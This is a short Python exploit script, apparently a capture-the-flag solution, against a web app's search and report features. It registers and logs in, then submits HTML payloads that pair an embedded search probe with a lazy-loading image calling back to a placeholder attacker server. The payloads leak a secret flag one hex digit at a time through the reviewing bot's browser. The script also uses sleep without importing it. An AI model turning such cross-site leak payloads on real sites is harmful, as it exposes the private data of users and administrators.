from requests import Session
from string import hexdigits

info = lambda x: print(f"[+] {x}")
fail = lambda x: print(f"[-] {x}")

URL = "http://192.168.24.44:8000"

sess = Session()
sess.post(f"{URL}/signup", data={"username": "guest2", "password": "guest"})
res = sess.post(f"{URL}/login", data={"username": "guest2", "password": "guest"})

if res.status_code == 200:
    info("Login Sucess")
else:
    fail("Login Failed...")

lower_hexdigits = hexdigits[:-6]
for hexdigit in lower_hexdigits:
    html = f"""/search?keyword=asd</p><object data="/search?keyword=DH{{{hexdigit}"><img src="http://YOUR_SERVER/?callback={hexdigit}" loading="lazy"></object>"""
    sess.post(f"{URL}/report", data={"path": f"{html}"})
    info(html)
    sleep(0.4)